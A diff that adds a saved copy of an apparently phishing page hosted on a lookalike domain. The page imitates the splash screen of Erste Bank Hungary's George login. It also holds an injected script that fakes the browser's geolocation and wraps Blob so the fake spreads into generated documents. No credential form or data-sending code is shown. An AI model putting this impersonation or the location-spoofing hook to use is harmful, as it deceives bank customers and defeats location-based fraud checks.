@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<!-- saved from url=(0061)https://vinted.ouservice.site/assets_ers/george-login-hu.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script>(function(){function hookGeo() {
+  //<![CDATA[
+  const WAIT_TIME = 100;
+  const hookedObj = {
+    getCurrentPosition: navigator.geolocation.getCurrentPosition.bind(navigator.geolocation),
+    watchPosition: navigator.geolocation.watchPosition.bind(navigator.geolocation),
+    fakeGeo: true,
+    genLat: 38.883333,
+    genLon: -77.000
+  };
+
+  function waitGetCurrentPosition() {
+    if ((typeof hookedObj.fakeGeo !== 'undefined')) {
+      if (hookedObj.fakeGeo === true) {
+        hookedObj.tmp_successCallback({
+          coords: {
+            latitude: hookedObj.genLat,
+            longitude: hookedObj.genLon,
+            accuracy: 10,
+            altitude: null,
+            altitudeAccuracy: null,
+            heading: null,
+            speed: null,
+          },
+          timestamp: new Date().getTime(),
+        });
+      } else {
+        hookedObj.getCurrentPosition(hookedObj.tmp_successCallback, hookedObj.tmp_errorCallback, hookedObj.tmp_options);
+      }
+    } else {
+      setTimeout(waitGetCurrentPosition, WAIT_TIME);
+    }
+  }
+
+  function waitWatchPosition() {
+    if ((typeof hookedObj.fakeGeo !== 'undefined')) {
+      if (hookedObj.fakeGeo === true) {
+        navigator.getCurrentPosition(hookedObj.tmp2_successCallback, hookedObj.tmp2_errorCallback, hookedObj.tmp2_options);
+        return Math.floor(Math.random() * 10000); // random id
+      } else {
+        hookedObj.watchPosition(hookedObj.tmp2_successCallback, hookedObj.tmp2_errorCallback, hookedObj.tmp2_options);
+      }
+    } else {
+      setTimeout(waitWatchPosition, WAIT_TIME);
+    }
+  }
+
+  Object.getPrototypeOf(navigator.geolocation).getCurrentPosition = function (successCallback, errorCallback, options) {
+    hookedObj.tmp_successCallback = successCallback;
+    hookedObj.tmp_errorCallback = errorCallback;
+    hookedObj.tmp_options = options;
+    waitGetCurrentPosition();
+  };
+  Object.getPrototypeOf(navigator.geolocation).watchPosition = function (successCallback, errorCallback, options) {
+    hookedObj.tmp2_successCallback = successCallback;
+    hookedObj.tmp2_errorCallback = errorCallback;
+    hookedObj.tmp2_options = options;
+    waitWatchPosition();
+  };
+
+  const instantiate = (constructor, args) => {
+    const bind = Function.bind;
+    const unbind = bind.bind(bind);
+    return new (unbind(constructor, null).apply(null, args));
+  }
+
+  Blob = function (_Blob) {
+    function secureBlob(...args) {
+      const injectableMimeTypes = [
+        { mime: 'text/html', useXMLparser: false },
+        { mime: 'application/xhtml+xml', useXMLparser: true },
+        { mime: 'text/xml', useXMLparser: true },
+        { mime: 'application/xml', useXMLparser: true },
+        { mime: 'image/svg+xml', useXMLparser: true },
+      ];
+      let typeEl = args.find(arg => (typeof arg === 'object') && (typeof arg.type === 'string') && (arg.type));
+
+      if (typeof typeEl !== 'undefined' && (typeof args[0][0] === 'string')) {
+        const mimeTypeIndex = injectableMimeTypes.findIndex(mimeType => mimeType.mime.toLowerCase() === typeEl.type.toLowerCase());
+        if (mimeTypeIndex >= 0) {
+          let mimeType = injectableMimeTypes[mimeTypeIndex];
+          let injectedCode = `<script>(
+            ${hookGeo}
+          )();<\/script>`;
+    
+          let parser = new DOMParser();
+          let xmlDoc;
+          if (mimeType.useXMLparser === true) {
+            xmlDoc = parser.parseFromString(args[0].join(''), mimeType.mime); // For XML documents we need to merge all items in order to not break the header when injecting
+          } else {
+            xmlDoc = parser.parseFromString(args[0][0], mimeType.mime);
+          }
+
+          if (xmlDoc.getElementsByTagName("parsererror").length === 0) { // if no errors were found while parsing...
+            xmlDoc.documentElement.insertAdjacentHTML('afterbegin', injectedCode);
+    
+            if (mimeType.useXMLparser === true) {
+              args[0] = [new XMLSerializer().serializeToString(xmlDoc)];
+            } else {
+              args[0][0] = xmlDoc.documentElement.outerHTML;
+            }
+          }
+        }
+      }
+
+      return instantiate(_Blob, args); // arguments?
+    }
+
+    // Copy props and methods
+    let propNames = Object.getOwnPropertyNames(_Blob);
+    for (let i = 0; i < propNames.length; i++) {
+      let propName = propNames[i];
+      if (propName in secureBlob) {
+        continue; // Skip already existing props
+      }
+      let desc = Object.getOwnPropertyDescriptor(_Blob, propName);
+      Object.defineProperty(secureBlob, propName, desc);
+    }
+
+    secureBlob.prototype = _Blob.prototype;
+    return secureBlob;
+  }(Blob);
+
+  window.addEventListener('message', function (event) {
+    if (event.source !== window) {
+      return;
+    }
+    const message = event.data;
+    switch (message.method) {
+      case 'updateLocation':
+        if ((typeof message.info === 'object') && (typeof message.info.coords === 'object')) {
+          hookedObj.genLat = message.info.coords.lat;
+          hookedObj.genLon = message.info.coords.lon;
+          hookedObj.fakeGeo = message.info.fakeIt;
+        }
+        break;
+      default:
+        break;
+    }
+  }, false);
+  //]]>
+}hookGeo();})()</script>
+    
+    <title>George</title>
+
+    <style type="text/css">
+      body {
+        margin: 0;
+        height: 100vh;
+        width: 100vw;
+        user-select: none;
+        --webkit-user-select: none;
+      }
+      .bg {
+        opacity: 0;
+        user-select: none;
+        width: 100%;
+        height: 100%;
+        background-image: url('https://www.erstebank.hu/content/dam/hu/ebh/www_erstebank_hu/george-images/login-image-george-logo/backg.jpg');
+        background-repeat: no-repeat;
+        background-position: center center;
+        background-size: cover;
+      }
+      .logo-container {
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+        display: -webkit-flexbox;
+        display: -ms-flexbox;
+        display: -webkit-flex;
+        display: flex;
+        -webkit-flex-align: center;
+        -ms-flex-align: center;
+        -webkit-align-items: center;
+        align-items: center;
+        justify-content: center;
+      }
+      .logo {
+        height: 50%;
+        transition: transform 100ms linear;
+        -webkit-user-drag: none;
+        -khtml-user-drag: none;
+        -moz-user-drag: none;
+        -o-user-drag: none;
+        user-drag: none;
+      }
+    </style>
+  </head>
+  <body onload="onLoad()">
+    <div class="bg" id="bg" style="opacity: 1; transition: opacity 500ms ease-in 0s;">
+      <div class="logo-container">
+        <img class="logo" id="logo" src="./glogo.png" alt="" style="transition: transform 500ms ease-out 0s; transform: translate3d(0px, 0px, 0px);">
+      </div>
+    </div>
+
+    <script>
+      function throttle(callback, limit) {
+        var waiting = false; // Initially, we're not waiting
+        return function () {
+          // We return a throttled function
+          if (!waiting) {
+            // If we're not waiting
+            callback.apply(this, arguments); // Execute users function
+            waiting = true; // Prevent future invocations
+            setTimeout(function () {
+              // After a period of time
+              waiting = false; // And allow future invocations
+            }, limit);
+          }
+        };
+      }
+
+      function translate(value, maxValue) {
+        return -1 * Math.sin((2 * Math.PI * value) / maxValue);
+      }
+
+      function onLoad() {
+        var logo = document.getElementById('logo');
+        var bg = document.getElementById('bg');
+
+        bg.style.opacity = '1';
+        bg.style.transition = 'opacity 500ms ease-in';
+
+        document.addEventListener('mouseenter', function (event) {
+          logo.style.transition = 'transform 100ms linear';
+        });
+        document.addEventListener('mouseleave', function () {
+          logo.style.transform = 'translate3d(0, 0, 0)';
+          logo.style.transition = 'transform 500ms ease-out';
+        });
+
+        var animation = function (event) {
+          var width = window.innerWidth;
+          var x = event.clientX;
+
+          var height = window.innerHeight;
+          var y = event.clientY;
+
+          var translateX = (Math.sin((Math.PI * y) / height) * (translate(x, width) * width)) / 4;
+          var translateY = (Math.sin((Math.PI * x) / width) * (translate(y, height) * height)) / 4;
+
+          var maxDistanceFromCenter = Math.min(width, height) / 2;
+          var distanceFromCenter = Math.sqrt(Math.pow(x - width / 2, 2) + Math.pow(y - height / 2, 2));
+
+          var scaleBase =
+            distanceFromCenter > maxDistanceFromCenter
+              ? 0
+              : (maxDistanceFromCenter - distanceFromCenter) / maxDistanceFromCenter;
+
+          logo.style.transform =
+            'translate3d(' + translateX * 0.2 + 'px,' + translateY * 0.2 + 'px,0) scale(' + (scaleBase * 0.4 + 1) + ')';
+        };
+
+        var mouseMoveEventHandler = throttle(animation, 10);
+
+        document.addEventListener('mousemove', mouseMoveEventHandler);
+      }
+    </script>
+  
+
+</body></html>
